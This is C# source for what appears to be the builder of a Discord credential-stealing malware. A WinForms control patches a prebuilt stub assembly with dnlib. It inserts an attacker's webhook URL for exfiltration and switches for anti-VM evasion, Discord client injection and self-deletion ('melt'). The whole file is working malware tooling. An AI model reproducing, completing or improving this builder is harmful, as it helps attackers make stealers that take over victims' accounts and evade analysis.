using DCB.Properties;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DCB
{
    public partial class stubbuilder : UserControl
    {
        public stubbuilder()
        {
            InitializeComponent();
        }
        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            var result = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }

            return result.ToString();
        }
        private const string STUBFILE = "DCB.stub";
        private void buildstubbtn_Click(object sender, EventArgs e)
        {
            if ((!webhookinput.Text.StartsWith("https://") && !webhookinput.Text.StartsWith("http://")) || !webhookinput.Text.Contains("."))
            {
                MessageBox.Show("Webhook is invalid", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            if (!File.Exists(STUBFILE))
            {
                MessageBox.Show(STUBFILE + " Not found", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            var tempfile = GenerateRandomString(10) + ".tmp";
            ModuleDefMD module = ModuleDefMD.Load(STUBFILE);
            TypeDef settingsType = module.Types.FirstOrDefault(t => t.Name == "Settings");
            var bools = 0;
            if (settingsType != null)
            {
                MethodDef cctor = settingsType.FindStaticConstructor();
                if (cctor != null)
                {
                    foreach (var instruction in cctor.Body.Instructions)
                    {
                        if (instruction.OpCode == OpCodes.Ldstr && (string)instruction.Operand == "")
                        {
                            // webhook
                            instruction.Operand = webhookinput.Text;
                        }
                        else if (instruction.OpCode == OpCodes.Ldc_I4_1)
                        {
                            switch (++bools)
                            {
                                case 1: // ping 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = pingcheckbox.Checked ? 1 : 0;
                                    break;

                                case 2: // antivm 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = antivmcheckbox.Checked ? 1 : 0;
                                    break;

                                case 3: // disinjection 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand =  discordinjectcheckbox.Checked ? 1 : 0;
                                    break;

                                case 4: // melt 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = meltcheckbox.Checked ? 1 : 0;
                                    break;
                            }
                        }
                    }
                }
                module.Write(tempfile);
            }
        }

        private void closebtn_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

    }
}
